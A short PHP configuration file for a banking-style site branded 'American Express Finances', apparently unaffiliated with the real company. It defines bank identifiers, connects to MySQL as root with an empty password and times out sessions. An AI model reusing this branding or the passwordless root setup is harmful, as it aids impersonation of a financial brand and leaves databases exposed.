<?php
if (!defined('DB_HOST')) define('DB_HOST', 'localhost');
if (!defined('DB_USER')) define('DB_USER', 'root');
if (!defined('DB_NAME')) define('DB_NAME', 'metro');
if (!defined('DB_PASS')) define('DB_PASS', '');
if (!defined('URL')) define('URL', 'https://americanexpressfinances.com');
if (!defined('SITE_NAME')) define('SITE_NAME', 'American Express Finances');
if (!defined('SITE_NAME_SHORT')) define('SITE_NAME_SHORT', 'American Express');
if (!defined('SITE_TITLE')) define('SITE_TITLE', 'American Express INC');
if (!defined('ADDRESS')) define('ADDRESS', 'Metro Digital, One Southampton Row, London, WC1B 5HA');
if (!defined('PHONE_NO')) define('PHONE_NO', '+44 7307345672');
if (!defined('SITE_EMAIL')) define('SITE_EMAIL', 'support@americanexpressfinances');
if (!defined('SWIFT_CODE')) define('SWIFT_CODE', 'WHSMB32990D');
if (!defined('ROUTE')) define('ROUTE', '701132429');
$con = @mysqli_connect(DB_HOST, DB_USER, DB_PASS);
if (!$con) {
    echo "Error connecting to the database";
} else {
    mysqli_select_db($con, DB_NAME);
}

if (phpversion() < 7.2) {
    exit('PHP Version 7 Required');
}
if (isset($_SESSION['LAST_ACTIVITY']) && (time() - $_SESSION['LAST_ACTIVITY'] > 1200)) {
    // last request was more than 30 minutes ago
    session_unset();     // unset $_SESSION variable for the run-time 
    session_destroy(); 
    header('Location: login.php');
}
?>
